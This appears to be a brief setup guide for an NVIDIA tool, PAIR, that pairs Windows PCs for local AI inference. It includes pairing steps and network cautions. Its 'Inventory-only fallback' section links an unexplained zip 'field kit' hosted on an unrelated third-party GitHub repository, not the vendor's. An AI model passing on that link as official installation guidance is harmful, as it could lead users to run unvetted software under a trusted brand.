# Add a Windows PC with NVIDIA PAIR

Download the official NVIDIA Windows x64 installer:

[Download NVIDIA PAIR 1.0.0 for Windows](https://github.com/NVIDIA/Personal-AI-Router/releases/download/v1.0.0/NVPAIR-Setup-1.0.0-x64.exe)

Official project: https://github.com/NVIDIA/Personal-AI-Router

## Setup
1. Run the installer on a machine you are permitted to use. Follow any administrator/firewall prompts with the machine owner's permission.
2. Open NVIDIA PAIR.
3. If this PC should run inference, enable one engine (Ollama, LM Studio, or llama.cpp) and download a model that fits its RAM/GPU memory.
4. Install PAIR on a second PC on the same trusted network.
5. On the first PC select Add node. Select the second PC, accept the invitation there, and enter the six-digit PIN.
6. Run a model request and inspect Jobs to confirm which PC served it.
7. Connect a compatible client to the URL shown in Endpoints on that client's own PC.

A client PC does not need its own model. Each serving PC needs the requested model available locally.

## Important distinction
PAIR connects local inference machines. It does not automatically join PCs on separate home and institutional networks. A cross-site private connection needs separate setup and testing on both ends. Do not publicly forward PAIR ports.

PAIR does not pool GPU memory, distribute one model transparently, or run arbitrary experiment scripts. ChatGPT subscriptions and NanoGPT are separate connections at the application/coordinator layer.

## Inventory-only fallback
[Download the offline Centec inventory kit](https://raw.githubusercontent.com/Aeshma-Daeva/NullFrame/centec-download-2026-10-28/downloads/Centec-Field-Kit-2026-10-27-r3.zip)

That kit needs no Python installation and does not enroll a worker or upload reports.

Official usage documentation:
https://docs.nvidia.com/local-ai/nvpair/getting-started
